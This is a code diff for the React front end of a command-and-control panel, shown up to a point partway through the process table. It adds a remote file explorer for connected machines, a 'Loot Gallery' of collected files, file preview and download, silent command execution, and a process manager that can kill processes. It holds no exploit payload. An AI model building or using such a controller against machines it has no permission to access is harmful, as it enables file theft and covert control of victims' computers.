@@ -1,7 +1,8 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { 
   LayoutDashboard, Monitor, Terminal as TermIcon, FolderOpen, 
-  Clipboard, Database, Settings, Play, Square, RefreshCw, Send, ShieldCheck, Cpu, HardDrive
+  Clipboard, Database, Settings, Play, Square, RefreshCw, Send, ShieldCheck, Cpu, HardDrive,
+  Image as ImageIcon, FileText, FileCode, Archive, File as FileGeneric, Eye, X, ZoomIn, ZoomOut, Download, Copy, Check
 } from 'lucide-react';
 import { invoke } from '@tauri-apps/api/core';
 
@@ -31,6 +32,42 @@ interface CommandLog {
   status: string;
 }
 
+interface FileEntry {
+  name: string;
+  size: string;
+  date: string;
+  is_dir: boolean;
+}
+
+interface LootFile {
+  name: string;
+  path: string;
+  size: number;
+  timestamp: string;
+  client: string;
+}
+
+interface ProcessEntry {
+  name: string;
+  pid: string;
+  mem: string;
+  user: string;
+  cpu: string;
+  title: string;
+}
+
+interface PreviewData {
+  status: 'ok' | 'error' | 'unsupported';
+  type?: 'image' | 'text' | 'binary';
+  name?: string;
+  path?: string;
+  mime?: string;
+  data?: string;
+  content?: string;
+  size?: string;
+  message?: string;
+}
+
 const Tooltip = ({ children, text, position = 'top' }: { children: React.ReactNode, text: string, position?: 'top' | 'bottom' | 'left' | 'right' }) => {
   const posClasses = {
     top: 'bottom-full left-1/2 -translate-x-1/2 mb-2',
@@ -56,7 +93,7 @@ const Tooltip = ({ children, text, position = 'top' }: { children: React.ReactNo
 };
 
 export default function App() {
-  const [activeTab, setActiveTab] = useState<'dashboard' | 'endpoints' | 'terminal' | 'files' | 'clipboard' | 'database' | 'settings'>('dashboard');
+  const [activeTab, setActiveTab] = useState<'dashboard' | 'endpoints' | 'terminal' | 'files' | 'processes' | 'clipboard' | 'database' | 'settings'>('dashboard');
   const [uptime, setUptime] = useState('0:00:00');
   const [startTime] = useState(Date.now());
   const [serverRunning, setServerRunning] = useState(true);
@@ -76,6 +113,35 @@ export default function App() {
   const [clients, setClients] = useState<Client[]>([]);
   const [logs, setLogs] = useState<CommandLog[]>([]);
   const [printedLogIds, setPrintedLogIds] = useState<Set<number>>(new Set());
+  
+  // File Explorer State
+  const [fileSubTab, setFileSubTab] = useState<'explorer' | 'loot'>('explorer');
+  const [currentPath, setCurrentPath] = useState<string>('');
+  const [fileList, setFileList] = useState<FileEntry[]>([]);
+  const [isFilesLoading, setIsFilesLoading] = useState(false);
+  const [fileError, setFileError] = useState<string>('');
+  const [fileTruncated, setFileTruncated] = useState(false);
+  const [fileTotalCount, setFileTotalCount] = useState(0);
+  const navHistoryRef = useRef<string[]>([]);
+  const navCounterRef = useRef(0);
+  const loadingTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+
+  // File Preview Modal State
+  const [previewOpen, setPreviewOpen] = useState(false);
+  const [previewData, setPreviewData] = useState<PreviewData | null>(null);
+  const [isPreviewLoading, setIsPreviewLoading] = useState(false);
+  const [previewZoom, setPreviewZoom] = useState(1);
+  const [copiedPath, setCopiedPath] = useState(false);
+  
+  // Loot Gallery State
+  const [lootFiles, setLootFiles] = useState<LootFile[]>([]);
+  const [selectedLoot, setSelectedLoot] = useState<LootFile | null>(null);
+  const [lootContent, setLootContent] = useState<string | null>(null);
+
+  // Process Manager State
+  const [processList, setProcessList] = useState<ProcessEntry[]>([]);
+  const [isProcessesLoading, setIsProcessesLoading] = useState(false);
+  const [processSearch, setProcessSearch] = useState('');
 
   // Terminal State
   const [termInput, setTermInput] = useState('');
@@ -119,8 +185,9 @@ export default function App() {
   const logsRef = useRef<CommandLog[]>([]);
   const printedIdsRef = useRef<Set<number>>(new Set());
 
-  // Data Fetching Ticker
+  // Data Fetching Ticker — poll faster (1s) when browsing files for snappier navigation
   useEffect(() => {
+    const pollInterval = (activeTab === 'files' && isFilesLoading) ? 1000 : 2000;
     const fetchData = async () => {
       try {
         const backendClients = await invoke<Client[]>('get_clients');
@@ -137,6 +204,38 @@ export default function App() {
             terminalUpdates.push(log.output);
             currentPrintedIds.add(log.id);
             hasNewPrinted = true;
+
+            // If this was an 'ls' command, parse it for the file explorer
+            if (log.command.startsWith('ls') || log.command === 'dir') {
+              parseFileList(log.output);
+            }
+            // If this was a 'preview' command, parse it for the preview modal
+            if (log.command.startsWith('preview ') || log.output.startsWith('[JSON_PREVIEW]')) {
+              try {
+                const jsonStr = log.output.replace('[JSON_PREVIEW]', '');
+                const parsed = JSON.parse(jsonStr);
+                setPreviewData(parsed);
+                setIsPreviewLoading(false);
+              } catch (e) {
+                console.error("Failed to parse preview response", e);
+                setIsPreviewLoading(false);
+              }
+            }
+            // If this was a 'pwd' command, update the current path
+            if (log.command === 'pwd') {
+              setCurrentPath(log.output.trim());
+            }
+            // If this was a 'ps' command, parse it for the process manager
+            if (log.command === 'ps' && log.output.startsWith('[JSON_PROCS]')) {
+              try {
+                const jsonStr = log.output.replace('[JSON_PROCS]', '');
+                const procs = JSON.parse(jsonStr);
+                setProcessList(procs);
+                setIsProcessesLoading(false);
+              } catch (e) {
+                console.error("Failed to parse processes", e);
+              }
+            }
           }
         });
 
@@ -150,14 +249,261 @@ export default function App() {
 
         setLogs(backendLogs);
         logsRef.current = backendLogs;
+        
+        // Fetch loot if on files tab
+        if (activeTab === 'files') {
+          const loot = await invoke<LootFile[]>('get_loot');
+          setLootFiles(loot);
+        }
       } catch (err) {
         console.error("Failed to fetch data from backend", err);
       }
     };
 
-    const interval = setInterval(fetchData, 2000);
+    const interval = setInterval(fetchData, pollInterval);
     return () => clearInterval(interval);
-  }, []);
+  }, [activeTab, isFilesLoading]);
+
+  // Tab Initialization Logic
+  useEffect(() => {
+    if (clients.length === 0) return;
+
+    if (activeTab === 'processes') {
+      // Auto-fetch processes only if the list is empty
+      if (processList.length === 0 && !isProcessesLoading) {
+        fetchProcesses();
+      }
+    } else if (activeTab === 'files') {
+      // Auto-fetch current path only if not already set
+      if (!currentPath && !isFilesLoading) {
+        setIsFilesLoading(true);
+        executeCommand('pwd', true);
+      }
+    }
+  }, [activeTab, clients.length]);
+
+  const parseFileList = (output: string) => {
+    // Clear loading timeout since we got a response
+    if (loadingTimerRef.current) {
+      clearTimeout(loadingTimerRef.current);
+      loadingTimerRef.current = null;
+    }
+    setFileError('');
+
+    // Fast path: JSON response from updated client
+    if (output.startsWith('[JSON_FILES]')) {
+      try {
+        const data = JSON.parse(output.replace('[JSON_FILES]', ''));
+        setCurrentPath(data.path || '');
+        setFileList(data.items || []);
+        setFileTruncated(data.truncated || false);
+        setFileTotalCount(data.count || 0);
+        setIsFilesLoading(false);
+        return;
+      } catch (e) {
+        console.error('Failed to parse JSON file list', e);
+      }
+    }
+
+    // Check for error responses
+    if (output.startsWith('[-]')) {
+      setFileError(output);
+      setIsFilesLoading(false);
+      return;
+    }
+
+    // Fallback: legacy text parser for backwards compatibility
+    const lines = output.split('\n');
+    const files: FileEntry[] = [];
+    
+    const pathMatch = output.match(/\[\+\] Directory: (.*)/);
+    if (pathMatch) {
+      setCurrentPath(pathMatch[1].trim());
+    } else if (output.includes('System Drives')) {
+      setCurrentPath('System Drives');
+    }
+
+    lines.forEach(line => {
+      if (line.includes('─') || line.includes('SIZE') || line.includes('TYPE') || line.includes('Directory:') || line.includes('System Drives') || !line.trim()) return;
+      
+      const isDir = line.includes('DIR') || line.includes('DRIVE');
+      const parts = line.trim().split(/\s{2,}/);
+      if (parts.length >= 3) {
+        files.push({
+          size: parts[0],
+          date: parts[1],
+          name: parts[2].replace(/\/$/, ''),
+          is_dir: isDir
+        });
+      }
+    });
+    setFileList(files);
+    setFileTruncated(false);
+    setFileTotalCount(files.length);
+    setIsFilesLoading(false);
+  };
+
+  const listDrives = () => {
+    if (clients.length === 0) return;
+    // Push current path to history before navigating
+    if (currentPath) {
+      navHistoryRef.current.push(currentPath);
+    }
+    setIsFilesLoading(true);
+    setFileError('');
+    setFileList([]);
+    // Set loading timeout — auto-clear after 15s
+    if (loadingTimerRef.current) clearTimeout(loadingTimerRef.current);
+    loadingTimerRef.current = setTimeout(() => {
+      setIsFilesLoading(false);
+      setFileError('Loading timed out. The client may be unreachable.');
+    }, 15000);
+    executeCommand('ls DRIVES');
+  };
+
+  const browseFolder = (path: string) => {
+    if (clients.length === 0) return;
+    // Debounce: increment nav counter — older responses will be discarded
+    navCounterRef.current += 1;
+    // Push current path to history before navigating
+    if (currentPath && currentPath !== path) {
+      navHistoryRef.current.push(currentPath);
+    }
+    // Optimistic UI: show loading immediately
+    setIsFilesLoading(true);
+    setFileError('');
+    setFileList([]);
+    // Set loading timeout — auto-clear after 15s
+    if (loadingTimerRef.current) clearTimeout(loadingTimerRef.current);
+    loadingTimerRef.current = setTimeout(() => {
+      setIsFilesLoading(false);
+      setFileError('Loading timed out. The client may be unreachable.');
+    }, 15000);
+    executeCommand(`ls "${path}"`);
+  };
+
+  const goBack = () => {
+    const history = navHistoryRef.current;
+    if (history.length > 0) {
+      const prevPath = history.pop()!;
+      if (prevPath === 'System Drives') {
+        listDrives();
+      } else {
+        // Don't push current path to history again (goBack already popped)
+        navCounterRef.current += 1;
+        setIsFilesLoading(true);
+        setFileError('');
+        setFileList([]);
+        if (loadingTimerRef.current) clearTimeout(loadingTimerRef.current);
+        loadingTimerRef.current = setTimeout(() => {
+          setIsFilesLoading(false);
+          setFileError('Loading timed out. The client may be unreachable.');
+        }, 15000);
+        executeCommand(`ls "${prevPath}"`);
+      }
+    }
+  };
+
+  // Helper: render clickable breadcrumbs from the current path
+  const renderBreadcrumbs = () => {
+    if (!currentPath || currentPath === 'System Drives') {
+      return <span className="text-[10px] font-mono text-slate-500 mt-0.5">{currentPath || 'Click refresh to start browsing...'}</span>;
+    }
+    // Split path into segments (handle both / and \ separators)
+    const normalized = currentPath.replace(/\\/g, '/');
+    const segments = normalized.split('/').filter(Boolean);
+    return (
+      <div className="flex items-center flex-wrap gap-0.5 mt-0.5">
+        {segments.map((seg, i) => {
+          const partialPath = segments.slice(0, i + 1).join('/');
+          // Add back drive colon for Windows paths (e.g. "C:" not "C")
+          const clickPath = i === 0 && seg.endsWith(':') ? seg + '/' : partialPath;
+          const isLast = i === segments.length - 1;
+          return (
+            <React.Fragment key={i}>
+              {i > 0 && <span className="text-slate-600 text-[10px] mx-0.5">/</span>}
+              <button
+                onClick={() => !isLast && browseFolder(clickPath)}
+                className={`text-[10px] font-mono px-1 py-0.5 rounded transition-colors ${
+                  isLast
+                    ? 'text-c2accent font-bold cursor-default'
+                    : 'text-slate-400 hover:text-c2accent hover:bg-slate-800 cursor-pointer'
+                }`}
+              >
+                {seg}
+              </button>
+            </React.Fragment>
+          );
+        })}
+      </div>
+    );
+  };
+
+  // Helper: Get file icon and preview capability based on extension
+  const getFileMeta = (file: FileEntry) => {
+    if (file.is_dir) {
+      return { icon: <FolderOpen className="w-4 h-4 text-amber-400 shrink-0" />, isPreviewable: false, type: 'Folder' };
+    }
+    const ext = file.name.split('.').pop()?.toLowerCase() || '';
+    if (['png', 'jpg', 'jpeg', 'gif', 'bmp', 'webp', 'ico', 'svg'].includes(ext)) {
+      return { icon: <ImageIcon className="w-4 h-4 text-emerald-400 shrink-0" />, isPreviewable: true, type: 'Image' };
+    }
+    if (['txt', 'log', 'md', 'json', 'yaml', 'yml', 'xml', 'csv', 'ini', 'cfg', 'env', 'toml'].includes(ext)) {
+      return { icon: <FileText className="w-4 h-4 text-sky-400 shrink-0" />, isPreviewable: true, type: 'Document' };
+    }
+    if (['py', 'js', 'ts', 'jsx', 'tsx', 'html', 'css', 'cpp', 'c', 'cs', 'rs', 'go', 'php', 'sql', 'sh', 'bat', 'ps1', 'cmd'].includes(ext)) {
+      return { icon: <FileCode className="w-4 h-4 text-violet-400 shrink-0" />, isPreviewable: true, type: 'Source Code' };
+    }
+    if (['zip', 'rar', '7z', 'tar', 'gz', 'bz2', 'xz'].includes(ext)) {
+      return { icon: <Archive className="w-4 h-4 text-amber-500 shrink-0" />, isPreviewable: false, type: 'Archive' };
+    }
+    return { icon: <FileGeneric className="w-4 h-4 text-slate-400 shrink-0" />, isPreviewable: false, type: 'File' };
+  };
+
+  // Trigger instant preview in modal
+  const requestPreview = (filePath: string, fileName: string) => {
+    if (clients.length === 0) return;
+    setPreviewOpen(true);
+    setIsPreviewLoading(true);
+    setPreviewData({ status: 'ok', name: fileName, path: filePath });
+    setPreviewZoom(1);
+    setCopiedPath(false);
+    executeCommand(`preview "${filePath}"`, true);
+  };
+
+  // Close preview on ESC
+  useEffect(() => {
+    const handleKeyDown = (e: KeyboardEvent) => {
+      if (e.key === 'Escape' && previewOpen) {
+        setPreviewOpen(false);
+      }
+    };
+    window.addEventListener('keydown', handleKeyDown);
+    return () => window.removeEventListener('keydown', handleKeyDown);
+  }, [previewOpen]);
+
+  const fetchProcesses = (silent: boolean = true) => {
+    if (clients.length === 0) return;
+    setIsProcessesLoading(true);
+    executeCommand('ps', silent);
+  };
+
+  const killProcess = (pidOrName: string) => {
+    if (clients.length === 0) return;
+    executeCommand(`killproc "${pidOrName}"`);
+    // Refresh after a short delay
+    setTimeout(fetchProcesses, 2000);
+  };
+
+  const viewLoot = async (file: LootFile) => {
+    setSelectedLoot(file);
+    try {
+      const content = await invoke<string>('get_loot_file', { path: file.path });
+      setLootContent(content);
+    } catch (err) {
+      console.error("Failed to load loot content", err);
+    }
+  };
 
   // Uptime & Resource Ticker
   useEffect(() => {
@@ -203,17 +549,23 @@ export default function App() {
     setSuggestions(matches);
   };
 
-  const executeCommand = async (cmd: string) => {
+  const executeCommand = async (cmd: string, silent: boolean = false) => {
     if (!cmd.trim() || clients.length === 0) return;
     
     const targetId = clients[0].id; // Default to first client for demo
-    setTermLogs(prev => [...prev, `> ${cmd}`]);
+    if (!silent) {
+      setTermLogs(prev => [...prev, `> ${cmd}`]);
+    }
     
     try {
       await invoke('send_command', { clientId: targetId, command: cmd });
-      setTermLogs(prev => [...prev, `[+] Command queued for ${targetId}`]);
+      if (!silent) {
+        setTermLogs(prev => [...prev, `[+] Command queued for ${targetId}`]);
+      }
     } catch (err) {
-      setTermLogs(prev => [...prev, `[-] Error sending command: ${err}`]);
+      if (!silent) {
+        setTermLogs(prev => [...prev, `[-] Error sending command: ${err}`]);
+      }
     }
 
     setTermInput('');
@@ -243,6 +595,7 @@ export default function App() {
               { id: 'dashboard', label: 'Dashboard', icon: LayoutDashboard, tip: 'View system overview and metrics' },
               { id: 'endpoints', label: 'Endpoints', icon: Monitor, tip: 'Manage connected remote machines' },
               { id: 'terminal', label: 'Command Center', icon: TermIcon, tip: 'Execute commands and view output' },
+              { id: 'processes', label: 'Process Manager', icon: Cpu, tip: 'View and kill running processes' },
               { id: 'files', label: 'File & Loot', icon: FolderOpen, tip: 'Browse and download collected files' },
               { id: 'clipboard', label: 'Clipboard Stream', icon: Clipboard, tip: 'Monitor remote clipboard changes' },
               { id: 'database', label: 'History & Logs', icon: Database, tip: 'Review command execution history' },
@@ -643,18 +996,407 @@ export default function App() {
 
           {/* 4. FILES VIEW */}
           {activeTab === 'files' && (
-            <div className="space-y-4">
-              <div className="flex items-center justify-between">
-                <h2 className="text-lg font-bold">Collected Loot & Files</h2>
+            <div className="h-full flex flex-col">
+              {/* Sub-Navigation */}
+              <div className="flex items-center space-x-1 mb-6 bg-slate-900/30 p-1 rounded-lg w-fit border border-c2border/50">
+                <button 
+                  onClick={() => setFileSubTab('explorer')}
+                  className={`px-4 py-1.5 rounded-md text-[10px] font-bold uppercase tracking-wider transition-all ${fileSubTab === 'explorer' ? 'bg-c2accent text-slate-900 shadow-lg' : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800'}`}
+                >
+                  Remote Explorer
+                </button>
+                <button 
+                  onClick={() => setFileSubTab('loot')}
+                  className={`px-4 py-1.5 rounded-md text-[10px] font-bold uppercase tracking-wider transition-all ${fileSubTab === 'loot' ? 'bg-c2accent text-slate-900 shadow-lg' : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800'}`}
+                >
+                  Loot Gallery
+                </button>
               </div>
-              <div className="bg-c2card border border-c2border rounded p-12 text-center flex flex-col items-center justify-center space-y-3">
-                <FolderOpen className="w-12 h-12 text-slate-500" />
-                <h3 className="text-base font-bold text-slate-200">No files collected yet</h3>
+
+              {/* Sub-Tab Content */}
+              <div className="flex-1 min-h-0">
+                {fileSubTab === 'explorer' ? (
+                  <div className="h-full bg-c2card border border-c2border rounded flex flex-col overflow-hidden shadow-lg">
+                    <div className="p-4 border-b border-c2border bg-slate-900/30 flex items-center justify-between">
+                      <div className="flex items-center space-x-3 min-w-0 flex-1">
+                        <FolderOpen className="w-5 h-5 text-c2accent shrink-0" />
+                        <div className="min-w-0 flex-1">
+                          <h2 className="text-xs font-bold uppercase tracking-wider text-slate-400">Remote File Explorer</h2>
+                          {renderBreadcrumbs()}
+                        </div>
+                      </div>
+                      <div className="flex items-center space-x-2 shrink-0">
+                        <button 
+                          onClick={goBack}
+                          disabled={navHistoryRef.current.length === 0}
+                          className="px-3 py-1.5 bg-slate-800 border border-c2border rounded text-[10px] font-bold hover:bg-slate-700 transition-colors flex items-center space-x-1.5 disabled:opacity-30 disabled:cursor-not-allowed"
+                          title="Go back to previous directory"
+                        >
+                          <span>←</span>
+                          <span>BACK</span>
+                        </button>
+                        <button 
+                          onClick={listDrives}
+                          className="px-3 py-1.5 bg-slate-800 border border-c2border rounded text-[10px] font-bold hover:bg-slate-700 transition-colors flex items-center space-x-1.5"
+                        >
+                          <HardDrive className="w-3 h-3" />
+                          <span>DRIVES</span>
+                        </button>
+                        <button 
+                          onClick={() => browseFolder(currentPath === 'System Drives' ? '.' : (currentPath || '.'))}
+                          className="px-3 py-1.5 bg-slate-800 border border-c2border rounded text-[10px] font-bold hover:bg-slate-700 transition-colors flex items-center space-x-1.5"
+                        >
+                          <RefreshCw className={`w-3 h-3 ${isFilesLoading ? 'animate-spin' : ''}`} />
+                          <span>REFRESH</span>
+                        </button>
+                      </div>
+                    </div>
+
+                    <div className="flex-1 flex overflow-hidden">
+                      {/* Quick Access Sidebar */}
+                      <div className="w-48 border-r border-c2border bg-slate-900/20 flex flex-col shrink-0">
+                        <div className="p-3 border-b border-c2border bg-slate-900/40 text-[9px] font-bold text-slate-500 uppercase tracking-widest">
+                          Quick Access
+                        </div>
+                        <div className="flex-1 overflow-y-auto p-2 space-y-1">
+                          {[
+                            { label: 'Desktop', icon: <Monitor className="w-3 h-3" />, path: 'SPECIAL:Desktop' },
+                            { label: 'Documents', icon: <Database className="w-3 h-3" />, path: 'SPECIAL:Documents' },
+                            { label: 'Downloads', icon: <HardDrive className="w-3 h-3" />, path: 'SPECIAL:Downloads' },
+                            { label: 'Pictures', icon: <ShieldCheck className="w-3 h-3" />, path: 'SPECIAL:Pictures' },
+                            { label: 'Videos', icon: <Monitor className="w-3 h-3" />, path: 'SPECIAL:Videos' },
+                            { label: 'Music', icon: <RefreshCw className="w-3 h-3" />, path: 'SPECIAL:Music' },
+                            { label: 'Favorites', icon: <ShieldCheck className="w-3 h-3" />, path: 'SPECIAL:Favorites' },
+                            { label: 'OneDrive', icon: <Database className="w-3 h-3" />, path: 'SPECIAL:OneDrive' },
+                            { label: 'AppData', icon: <Database className="w-3 h-3" />, path: 'SPECIAL:AppData' },
+                          ].map((item) => (
+                            <button
+                              key={item.label}
+                              onClick={() => browseFolder(item.path)}
+                              className="w-full flex items-center space-x-2 px-3 py-2 rounded text-[10px] text-slate-400 hover:bg-slate-800 hover:text-slate-200 transition-colors"
+                            >
+                              {item.icon}
+                              <span>{item.label}</span>
+                            </button>
+                          ))}
+                        </div>
+                      </div>
+
+                      <div className="flex-1 overflow-y-auto">
+                        {/* Error message */}
+                        {fileError && (
+                          <div className="m-4 p-3 bg-red-500/10 border border-red-500/30 rounded text-red-400 text-xs flex items-center space-x-2">
+                            <ShieldCheck className="w-4 h-4 shrink-0" />
+                            <span>{fileError}</span>
+                          </div>
+                        )}
+                        {/* Truncation warning */}
+                        {fileTruncated && (
+                          <div className="mx-4 mt-4 p-2 bg-amber-500/10 border border-amber-500/30 rounded text-amber-400 text-[10px]">
+                            Showing 500 of {fileTotalCount} items. Large directory — some items are hidden.
+                          </div>
+                        )}
+                        {fileList.length === 0 && !fileError ? (
+                          <div className="p-24 text-center text-slate-500 text-xs italic flex flex-col items-center justify-center space-y-4">
+                            <FolderOpen className="w-12 h-12 opacity-10" />
+                            <div>{isFilesLoading ? (
+                              <div className="flex flex-col items-center space-y-2">
+                                <RefreshCw className="w-5 h-5 animate-spin text-c2accent" />
+                                <span>Loading remote files...</span>
+                              </div>
+                            ) : 'No files listed. Select a client and click Refresh.'}</div>
+                          </div>
+                        ) : fileList.length > 0 && (
+                          <table className="w-full text-left border-collapse">
+                            <thead>
+                              <tr className="border-b border-c2border bg-slate-900/50 text-[10px] uppercase tracking-wider text-slate-500 font-bold sticky top-0 z-10">
+                                <th className="p-4">Name</th>
+                                <th className="p-4">Size</th>
+                                <th className="p-4">Modified</th>
+                                <th className="p-4 text-right">Actions</th>
+                              </tr>
+                            </thead>
+                            <tbody className="divide-y divide-c2border text-[11px]">
+                              {/* Parent Directory Button */}
+                              {currentPath && currentPath !== 'System Drives' && (
+                                <tr 
+                                  className="hover:bg-slate-800/30 cursor-pointer transition-colors group"
+                                  onDoubleClick={() => {
+                                    if (currentPath.length <= 3 && currentPath.includes(':')) {
+                                      listDrives();
+                                    } else {
+                                      browseFolder(currentPath + '/..');
+                                    }
+                                  }}
+                                  onClick={() => {
+                                    if (currentPath.length <= 3 && currentPath.includes(':')) {
+                                      listDrives();
+                                    } else {
+                                      browseFolder(currentPath + '/..');
+                                    }
+                                  }}
+                                >
+                                  <td className="p-4 font-bold text-c2accent flex items-center space-x-2">
+                                    <FolderOpen className="w-4 h-4" />
+                                    <span>..</span>
+                                  </td>
+                                  <td className="p-4 text-slate-500">--</td>
+                                  <td className="p-4 text-slate-500">--</td>
+                                  <td className="p-4 text-right"></td>
+                                </tr>
+                              )}
+                              {fileList.map((file, i) => {
+                                const meta = getFileMeta(file);
+                                const fullPath = currentPath === 'System Drives' 
+                                  ? file.name 
+                                  : (currentPath ? `${currentPath}/${file.name}` : file.name);
+
+                                return (
+                                  <tr 
+                                    key={i} 
+                                    className={`hover:bg-slate-800/30 transition-colors group ${file.is_dir || meta.isPreviewable ? 'cursor-pointer' : ''}`}
+                                    onDoubleClick={() => {
+                                      if (file.is_dir) {
+                                        browseFolder(fullPath);
+                                      } else if (meta.isPreviewable) {
+                                        requestPreview(fullPath, file.name);
+                                      }
+                                    }}
+                                  >
+                                    <td className="p-4 flex items-center space-x-3">
+                                      {meta.icon}
+                                      <span 
+                                        className={`font-medium ${
+                                          file.is_dir 
+                                            ? 'text-slate-200 cursor-pointer hover:text-c2accent' 
+                                            : meta.isPreviewable 
+                                              ? 'text-slate-200 hover:text-emerald-400 transition-colors' 
+                                              : 'text-slate-300'
+                                        }`}
+                                        onClick={() => {
+                                          if (file.is_dir) {
+                                            browseFolder(fullPath);
+                                          } else {
+                                            requestPreview(fullPath, file.name);
+                                          }
+                                        }}
+                                      >
+                                        {file.name}
+                                      </span>
+                                    </td>
+                                    <td className="p-4 font-mono text-slate-400">{file.size}</td>
+                                    <td className="p-4 text-slate-500">{file.date}</td>
+                                    <td className="p-4 text-right">
+                                      {!file.is_dir && (
+                                        <div className="flex items-center justify-end space-x-1">
+                                          <Tooltip text="Quick Preview" position="left">
+                                            <button 
+                                              onClick={() => requestPreview(fullPath, file.name)}
+                                              className="p-1.5 hover:bg-emerald-500/20 hover:text-emerald-400 text-slate-400 rounded transition-colors"
+                                            >
+                                              <Eye className="w-4 h-4" />
+                                            </button>
+                                          </Tooltip>
+                                          <Tooltip text="Download file to C2 loot" position="left">
+                                            <button 
+                                              onClick={() => executeCommand(`download "${fullPath}"`)}
+                                              className="p-1.5 hover:bg-c2accent/20 hover:text-c2accent text-slate-400 rounded transition-colors"
+                                            >
+                                              <HardDrive className="w-4 h-4" />
+                                            </button>
+                                          </Tooltip>
+                                        </div>
+                                      )}
+                                    </td>
+                                  </tr>
+                                );
+                              })}
+                            </tbody>
+                          </table>
+                        )}
+                      </div>
+                    </div>
+                  </div>
+                ) : (
+                  <div className="h-full bg-c2card border border-c2border rounded overflow-hidden flex shadow-lg">
+                    {/* Loot List */}
+                    <div className="w-80 border-r border-c2border flex flex-col bg-slate-900/20">
+                      <div className="p-4 border-b border-c2border bg-slate-900/40 text-[10px] font-bold text-slate-500 uppercase tracking-widest">
+                        Collected Files ({lootFiles.length})
+                      </div>
+                      <div className="flex-1 overflow-y-auto">
+                        {lootFiles.length === 0 ? (
+                          <div className="p-12 text-center text-slate-600 text-[10px] italic">No loot collected yet</div>
+                        ) : (
+                          lootFiles.map((file, i) => (
+                            <div 
+                              key={i}
+                              onClick={() => viewLoot(file)}
+                              className={`p-4 border-b border-c2border/50 cursor-pointer transition-colors hover:bg-slate-800/50 ${selectedLoot?.path === file.path ? 'bg-c2accent/10 border-l-4 border-l-c2accent' : ''}`}
+                            >
+                              <div className="text-[11px] font-bold text-slate-200 truncate">{file.name}</div>
+                              <div className="flex items-center justify-between mt-2">
+                                <span className="px-1.5 py-0.5 bg-slate-800 rounded text-[9px] text-slate-400 font-mono uppercase border border-c2border/50">{file.client}</span>
+                                <span className="text-[9px] text-slate-500">{file.timestamp}</span>
+                              </div>
+                            </div>
+                          ))
+                        )}
+                      </div>
+                    </div>
+
+                    {/* Loot Preview */}
+                    <div className="flex-1 bg-slate-950 flex flex-col relative">
+                      {selectedLoot ? (
+                        <>
+                          <div className="p-4 border-b border-c2border bg-slate-900/40 flex items-center justify-between">
+                            <div className="flex items-center space-x-3">
+                              <div className="text-[11px] font-mono text-c2accent bg-c2accent/10 px-2 py-1 rounded">{selectedLoot.name}</div>
+                              <div className="text-[10px] text-slate-500 uppercase tracking-widest">{Math.round(selectedLoot.size / 1024)} KB</div>
+                            </div>
+                            <button 
+                              onClick={() => {
+                                // Trigger browser download of the loot
+                                const link = document.createElement('a');
+                                link.href = `data:application/octet-stream;base64,${lootContent}`;
+                                link.download = selectedLoot.name;
+                                link.click();
+                              }}
+                              className="p-2 hover:bg-slate-800 rounded text-slate-400 hover:text-slate-200 transition-colors"
+                            >
+                              <HardDrive className="w-4 h-4" />
+                            </button>
+                          </div>
+                          <div className="flex-1 overflow-auto p-8 flex items-center justify-center bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-slate-900 to-slate-950">
+                            {selectedLoot.name.match(/\.(png|jpg|jpeg|gif)$/i) ? (
+                              lootContent ? (
+                                <img 
+                                  src={`data:image/png;base64,${lootContent}`} 
+                                  alt="Loot Preview" 
+                                  className="max-w-full max-h-full object-contain shadow-[0_0_50px_rgba(0,0,0,0.5)] border border-c2border rounded-lg" 
+                                />
+                              ) : (
+                                <div className="text-slate-500 animate-pulse flex flex-col items-center space-y-3">
+                                  <RefreshCw className="w-8 h-8 animate-spin" />
+                                  <span className="text-[10px] font-bold uppercase tracking-widest">Decoding Image Data...</span>
+                                </div>
+                              )
+                            ) : (
+                              <div className="w-full h-full bg-slate-900 rounded-lg border border-c2border overflow-hidden flex flex-col">
+                                <div className="p-2 bg-slate-800/50 border-b border-c2border text-[9px] font-mono text-slate-500 uppercase tracking-widest px-4">Raw File Content</div>
+                                <pre className="flex-1 text-[10px] font-mono text-slate-400 p-6 overflow-auto whitespace-pre-wrap leading-relaxed">
+                                  {lootContent ? atob(lootContent) : 'Loading content...'}
+                                </pre>
+                              </div>
+                            )}
+                          </div>
+                        </>
+                      ) : (
+                        <div className="flex-1 flex flex-col items-center justify-center text-slate-600 space-y-4">
+                          <div className="w-20 h-20 bg-slate-900 rounded-full flex items-center justify-center border border-c2border/30">
+                            <Monitor className="w-10 h-10 opacity-20" />
+                          </div>
+                          <div className="text-[10px] font-bold uppercase tracking-[0.2em] opacity-40">Select a file to preview</div>
+                        </div>
+                      )}
+                    </div>
+                  </div>
+                )}
               </div>
             </div>
           )}
 
-          {/* 5. CLIPBOARD VIEW */}
+          {/* 5. PROCESS MANAGER VIEW */}
+          {activeTab === 'processes' && (
+            <div className="h-full flex flex-col space-y-4">
+              <div className="flex items-center justify-between">
+                <div className="flex items-center space-x-3">
+                  <h2 className="text-lg font-bold">Process Manager</h2>
+                  <span className="text-[10px] bg-slate-800 text-slate-400 px-2 py-0.5 rounded border border-c2border/50 uppercase tracking-widest">
+                    {processList.length} Processes
+                  </span>
+                </div>
+                <div className="flex items-center space-x-2">
+                  <div className="relative">
+                    <Send className="absolute left-3 top-1/2 -translate-y-1/2 w-3 h-3 text-slate-500" />
+                    <input 
+                      type="text" 
+                      placeholder="Search processes..." 
+                      value={processSearch}
+                      onChange={(e) => setProcessSearch(e.target.value)}
+                      className="bg-slate-900 border border-c2border rounded-full pl-9 pr-4 py-1.5 text-xs w-64 focus:outline-none focus:border-c2accent/50 transition-colors"
+                    />
+                  </div>
+                  <button 
+                    onClick={fetchProcesses}
+                    disabled={isProcessesLoading}
+                    className="flex items-center space-x-2 px-3 py-1.5 bg-slate-800 hover:bg-slate-700 rounded-lg text-xs font-bold transition-colors border border-c2border disabled:opacity-50"
+                  >
+                    <RefreshCw className={`w-3 h-3 ${isProcessesLoading ? 'animate-spin' : ''}`} />
+                    <span>REFRESH</span>
+                  </button>
+                </div>
+              </div>
+
+              <div className="flex-1 bg-c2card border border-c2border rounded overflow-hidden flex flex-col">
+                <div className="overflow-y-auto flex-1">
+                  <table className="w-full text-left border-collapse">
+                    <thead className="sticky top-0 z-10">
+                      <tr className="border-b border-c2border bg-slate-900 text-xs text-slate-400">
+                        <th className="p-3 font-bold uppercase tracking-wider">Process Name</th>
